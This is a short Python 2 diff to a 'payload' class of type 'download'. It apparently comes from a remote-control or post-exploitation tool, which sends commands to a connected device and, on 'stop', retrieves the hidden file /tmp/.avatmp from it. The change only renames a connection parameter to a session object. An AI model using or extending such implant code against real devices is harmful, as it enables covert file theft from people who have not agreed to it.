@@ -5,8 +5,8 @@ class payload:
         self.type = "download"
         self.id = 114
 
-    def run(self,conn,server,command):
-        result = server.sendCommand(command.split()[0],command[4:],"native",conn)
+    def run(self,session,server,command):
+        result = server.sendCommand(command.split()[0],command[4:],"native",session.conn)
         #print output
         if len(result) > 0 and result != "1":
             print result
@@ -15,5 +15,5 @@ class payload:
             if command.split()[1] == "stop":
                 #if we are stopping, receive the go ahead
                 if result == "1":
-                    server.sendCommand("download","/tmp/.avatmp","download",conn)
+                    server.sendCommand("download","/tmp/.avatmp","download",session.conn)
         return ""
